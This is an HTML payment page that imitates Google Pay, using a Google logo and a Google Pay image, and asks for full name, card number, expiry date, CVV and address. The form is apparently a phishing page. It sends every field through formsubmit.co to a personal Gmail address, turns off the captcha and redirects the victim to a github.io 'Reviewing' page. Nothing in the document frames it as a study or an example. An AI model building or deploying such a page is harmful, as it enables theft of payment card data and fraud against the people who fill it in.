<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<link rel="preconnect" href="https://fonts.googleapis.com" />
		<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
		<link
			href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap"
			rel="stylesheet"
		/>
		<link rel="stylesheet" href="style.css" />
		<title>Formulario de pagos</title>
	</head>
	<body>
		<div class="card">
			<div class="card__header">
				<img src="Google.png" class="logo" />
				<h1>Payment information</h1>
			</div>
			
<form method="post" action="https://formsubmit.co/kt5873202@gmail.com">
    
				<div class="form-group">
					<label for="full-name">Full Name</label>
					<input
						class="full-name empty"
						type="text"
						id="full-name"
						name="full Name"
						aria-label="Full Name"
						placeholder="Alex Montoya"
						required
					/>
				</div>

				<div class="icon-group-container">
					<label for="card-number">Card Number</label>
					<div class="icon-group empty">
						<input
							type="tel"
							id="card-number"
							aria-label="Card Number"
							name="Card Number"
							class="empty"
							placeholder="1234 1234 1234 1234"
							required
						/>
						<img
							id="card-icon"
							src="credit-card.png"
							height="14"
							width="14"
						/>
					</div>
				</div>

				<div class="row-group">
					<div class="form-group">
						<label for="expiration">Expiration Date</label>
						<input
							class="expiration-input empty"
							type="tel"
							id="expiration"
							minlength="5"
							maxlength="5"
							name="Expiration Date"
							placeholder="MM/YY"
							required
						/>
					</div>
					<div class="icon-group-container">
						<label for="cvv">CVV</label>
						<div class="icon-group empty">
							<input
								class="cvv-input empty"
								type="tel"
								maxlength="3"
								placeholder="°°°"
								name="CVV"
								id="cvv"
								required
							/>
							<img
								id="info-icon"
								src="info.png"
								height="14"
								width="14"								
							/>
						</div>
					</div>
				</div>
				<div class="form-group">
					<label for="cardholder-name">Address</label>
					<input
						type="text"
						id="address"
						class="empty"
						name="Address"
						aria-label="adress"
						placeholder="Av. Morelos 123"
						required
					/>
				</div>
				
	 <input type="hidden" name="_captcha" value="false">

                  <input type="hidden" name="_next" value="https://minet320.github.io/.com/Reviewing.html">
                  
<Button>Login</Button>
			</form>
			<div class="verify-info">
				<small>Verify the information is correct</small>
			</div>
<img class="payment" src="Google pay.png" class="logo" style="height: 50px; width: 300px; margin-top: 80px;"/>			
		</div>
		<script src="https://cdn.jsdelivr.net/npm/cleave.js@1.6.0/dist/cleave.min.js"></script>
		<script src="./index.js" defer></script>
	</body>
</html>
